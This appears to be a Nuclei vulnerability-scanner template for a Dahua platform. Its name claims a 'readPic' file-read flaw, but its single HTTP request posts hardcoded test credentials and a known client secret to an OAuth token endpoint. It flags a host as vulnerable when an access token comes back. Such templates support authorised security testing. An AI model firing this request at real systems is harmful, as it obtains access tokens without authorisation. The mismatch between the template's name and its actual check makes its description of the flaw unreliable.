id: dahuaznwl-readPic-fileread

info:
  name: dahuaznwl-readPic-fileread
  author: dahuaznwl-readPic-fileread

http:
  - raw:
      - |
        POST /evo-apigw/evo-oauth/oauth/token HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36
        Content-Length: 109
        Content-Type: application/x-www-form-urlencoded
        Accept-Encoding: gzip
        Connection: close

        username=justForTest&password=1&grant_type=password&client_id=web_client&client_secret=web_client&public_key=


    matchers:
      - type: dsl
        dsl:
          - contains_all(body,"access_token","token_type","expires_in")